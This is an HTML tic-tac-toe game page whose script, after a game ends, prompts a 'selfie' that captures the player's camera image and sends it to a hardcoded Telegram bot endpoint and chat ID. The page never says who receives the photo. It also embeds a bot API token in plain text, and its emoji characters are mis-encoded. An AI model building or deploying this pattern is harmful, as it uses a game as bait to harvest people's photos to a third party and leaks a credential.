<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tic Tac Toe ğŸ“¸</title>
  <style>
    body {
      margin: 0; font-family: sans-serif; background: #111; color: white;
      display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
    }
    h1 { margin: 15px 0; font-size: 2em; }
    .board {
      display: grid;
      grid-template-columns: repeat(3, 100px);
      grid-template-rows: repeat(3, 100px);
      gap: 5px;
    }
    .cell {
      background: #222;
      display: flex; align-items: center; justify-content: center;
      font-size: 2.5em;
      cursor: pointer;
      transition: all 0.3s;
      border: 2px solid #444;
      border-radius: 10px;
    }
    .cell:hover {
      background: #333;
      transform: scale(1.05);
    }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      border: 2px solid #fff;
      border-radius: 25px;
      background: transparent;
      color: white;
      font-size: 1em;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: white;
      color: black;
    }
    #cameraView { display: none; margin-top: 10px; }
    #selfieBtn { display: none; }
  </style>
</head>
<body>
  <h1>Tic Tac Toe ğŸ®</h1>
  <div class="board" id="board"></div>
  <button onclick="resetGame()">ğŸ” Reset</button>
  <button id="selfieBtn" onclick="capturePhoto()">ğŸ“¸ Selfie lo aur bhejo</button>

  <video id="cameraView" autoplay playsinline width="300"></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>

  <script>
    const board = document.getElementById("board");
    const selfieBtn = document.getElementById("selfieBtn");
    let currentPlayer = "âŒ";
    let cells = Array(9).fill("");
    let gameActive = true;
    let winMessage = "";

    const WINNING_COMBOS = [
      [0,1,2],[3,4,5],[6,7,8],
      [0,3,6],[1,4,7],[2,5,8],
      [0,4,8],[2,4,6]
    ];

    function drawBoard() {
      board.innerHTML = "";
      cells.forEach((val, i) => {
        const div = document.createElement("div");
        div.className = "cell";
        div.textContent = val;
        div.onclick = () => handleClick(i);
        board.appendChild(div);
      });
    }

    function handleClick(index) {
      if (!gameActive || cells[index] !== "") return;
      cells[index] = currentPlayer;
      currentPlayer = currentPlayer === "âŒ" ? "â­•" : "âŒ";
      drawBoard();
      checkWinner();
    }

    function checkWinner() {
      for (const combo of WINNING_COMBOS) {
        const [a, b, c] = combo;
        if (cells[a] && cells[a] === cells[b] && cells[a] === cells[c]) {
          gameActive = false;
          winMessage = `${cells[a]} Wins!`;
          setTimeout(() => {
            alert(winMessage);
            selfieBtn.style.display = "inline-block";
          }, 300);
          return;
        }
      }
      if (!cells.includes("")) {
        gameActive = false;
        winMessage = "Draw Game!";
        setTimeout(() => {
          alert(winMessage);
          selfieBtn.style.display = "inline-block";
        }, 300);
      }
    }

    function resetGame() {
      cells = Array(9).fill("");
      gameActive = true;
      currentPlayer = "âŒ";
      selfieBtn.style.display = "none";
      drawBoard();
    }

    async function capturePhoto() {
      const video = document.getElementById("cameraView");
      const canvas = document.getElementById("photoCanvas");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = "block";

        await new Promise(resolve => setTimeout(resolve, 2000)); // wait 2s for camera

        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());
        video.style.display = "none";

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", "7544013296");
          formData.append("caption", winMessage);
          formData.append("photo", blob, "selfie.png");

          fetch(`https://api.telegram.org/bot7826713494:AAGp_XsIQNfNf8XwOx6FT4xMj_AylVcuS3A/sendPhoto`, {
            method: "POST",
            body: formData
          }).then(() => alert("ğŸ“¸ Selfie sent to Telegram!")).catch(console.error);
        }, "image/png");
      } catch (err) {
        alert("Camera access denied âŒ");
        console.error(err);
      }
    }

    drawBoard();
  </script>
</body>
</html>
